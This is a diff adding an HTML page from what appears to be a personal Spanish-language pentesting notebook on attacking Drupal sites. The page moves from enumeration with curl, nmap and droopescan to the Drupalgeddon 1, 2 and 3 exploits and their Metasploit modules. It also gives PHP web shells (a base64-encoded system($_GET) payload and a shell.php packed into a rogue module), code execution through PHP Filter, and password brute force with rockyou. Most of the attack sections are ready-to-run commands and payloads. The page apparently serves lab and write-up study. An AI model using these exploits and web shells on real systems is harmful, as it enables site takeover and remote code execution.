@@ -1,0 +1,239 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Drupal | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="drupal">
+          <div class="note-tabbar">
+            <span>Drupal</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Aplicaciones Web/CMS</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">aplicaciones web / cms / drupal</p>
+            <h2>Drupal</h2>
+
+            <h2>Enumeración</h2>
+
+            <section class="code-card">
+              <h3>Identificar Drupal</h3>
+              <pre><code>curl -s http://&lt;ip_target&gt; | grep Drupal</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Nmap</h3>
+              <pre><code># Detección de versión de Drupal y módulos
+nmap -sV --script http-drupal-enum &lt;url&gt;
+
+# Escaneo de vulnerabilidades en Drupal
+nmap -sV --script &quot;http-drupal* and not http-drupal-brute&quot; &lt;url&gt;
+
+# Detección de usuarios de Drupal
+nmap -sV --script http-drupal-users &lt;url&gt;
+
+# Escaneo completo para confirmar si se está utilizando Drupal
+nmap --script=http-drupal-enum --script-args http-drupal-enum.root=/ -p 80,443 &lt;url&gt;
+
+# Detectar vulnerabilidades específicas en Drupal y sus módulos
+nmap --script=http-vuln* -p 80,443 &lt;url&gt;</code></pre>
+            </section>
+
+            <aside class="callout">
+              <p>Revisar ficheros habituales como <code>CHANGELOG.txt</code>, <code>robots.txt</code> y <code>README.txt</code> para obtener versión, rutas y pistas de módulos.</p>
+            </aside>
+
+            <h2><a href="https://github.com/SamJoan/droopescan">Droopescan</a></h2>
+
+            <section class="code-card">
+              <h3>Instalar Droopescan</h3>
+              <pre><code>sudo pip3 install droopescan</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Enumeración básica</h3>
+              <pre><code>droopescan scan drupal --url &lt;url&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Enumerar plugins y temas</h3>
+              <pre><code>droopescan scan drupal -u &lt;url&gt; -e plugins,themes</code></pre>
+            </section>
+
+            <h2><a href="https://www.exploit-db.com/exploits/34992">Drupalgeddon1 SQLi: Drupal 7.0-7.31 (CVE-2014-3704)</a></h2>
+
+            <section class="code-card">
+              <h3>Crear usuario administrador</h3>
+              <pre><code>python2.7 drupalgeddon.py -t http://&lt;url&gt; -u hacker -p pwnd</code></pre>
+            </section>
+
+            <h2><a href="https://www.exploit-db.com/exploits/44448">Drupalgeddon2 RCE: Drupal 6.x, 7.x-7.58, 8.x-8.5.1 (CVE-2018-7600)</a></h2>
+
+            <section class="code-card">
+              <h3>Comprobar explotación</h3>
+              <pre><code>python3 drupalgeddon2.py
+curl -s http://&lt;url&gt;/hello.txt</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Preparar payload PHP en Base64</h3>
+              <pre><code>echo &#x27;&lt;?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?&gt;&#x27; | base64
+
+PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Editar exploit</h3>
+              <pre><code># Modificar el payload original del exploit por nuestro payload
+echo &quot;PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K&quot; | base64 -d | tee mrb3n.php</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Explotar RCE</h3>
+              <pre><code>python3 drupalgeddon2.py
+curl http://&lt;url&gt;/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id</code></pre>
+            </section>
+
+            <h2>Drupalgeddon3: Drupal 7.x/8.x con cookie de sesión (CVE-2018-7602)</h2>
+
+            <section class="code-card">
+              <h3>Metasploit</h3>
+              <pre><code>use exploit/multi/http/drupal_drupageddon3
+set RHOSTS &lt;ip_target&gt;
+set VHOST &lt;vhost&gt;
+set DRUPAL_SESSION &lt;cookie_sesion&gt;
+set DRUPAL_NODE 1
+set LHOST &lt;kali_ip&gt;</code></pre>
+            </section>
+
+            <h2>Acceso Drupal: editar módulo PHP Filter</h2>
+
+            <p>Con acceso administrativo se puede habilitar <code>PHP filter</code> en módulos, crear una <code>Basic page</code> y ejecutar código PHP. En Drupal 8 y posteriores puede requerir instalar el módulo primero.</p>
+
+            <section class="code-card">
+              <h3>Instalar PHP Filter si no existe</h3>
+              <pre><code>wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>PHP con parámetro de ejecución</h3>
+              <pre><code># Title
+Test
+# Body
+&lt;?php
+system($_GET[&#x27;dcfdd5e021a869fcc6dfaef8bf31377e&#x27;]);
+?&gt;
+# Text Format
+PHP code
+# Explotar RCE
+http://url/&lt;node_creado&gt;/?dcfdd5e021a869fcc6dfaef8bf31377e=whoami</code></pre>
+            </section>
+
+            <h2>Acceso Drupal: cargar módulo nuevo controlado</h2>
+
+            <section class="code-card">
+              <h3>Descargar y descomprimir módulo</h3>
+              <pre><code>wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+tar xvf captcha-8.x-1.2.tar.gz</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>shell.php</h3>
+              <pre><code>&lt;?php
+system($_GET[&#x27;fe8edbabc5c5c9b7b764504cd22b17af&#x27;]);
+?&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>.htaccess para permitir acceso directo</h3>
+              <pre><code>&lt;IfModule mod_rewrite.c&gt;
+RewriteEngine On
+RewriteBase /
+&lt;/IfModule&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Empaquetar módulo</h3>
+              <pre><code>mv shell.php .htaccess captcha
+tar cvf captcha.tar.gz captcha/</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Ejecutar payload</h3>
+              <pre><code>curl -s http://url/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id</code></pre>
+            </section>
+
+            <h2>Metasploit</h2>
+
+            <section class="code-card">
+              <h3>Módulos útiles</h3>
+              <pre><code># Escaneo básico de Drupal
+use auxiliary/scanner/http/drupal_version
+set RHOSTS &lt;url&gt;
+set RPORT 80
+set TARGETURI /
+run
+
+# Enumerar usuarios de Drupal
+use auxiliary/scanner/http/drupal_users_enum
+set RHOSTS &lt;url&gt;
+set RPORT 80
+set TARGETURI /
+run
+
+# Fuerza bruta
+set RHOSTS &lt;url&gt;
+set USERNAME &lt;nombre_usuario&gt;
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run
+
+# Drupalgeddon1
+use exploit/multi/http/drupal_drupageddon
+# Drupalgeddon2
+use exploit/unix/webapp/drupal_drupalgeddon2
+# Drupalgeddon3
+use exploit/multi/http/drupal_drupageddon3</code></pre>
+            </section>
+
+            <h2>Máquinas relacionadas</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=bastard">Bastard</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>aplicaciones_web</span>
+              <span>cms</span>
+              <span>drupal</span>
+              <span>droopescan</span>
+              <span>drupalgeddon</span>
+              <span>rce</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
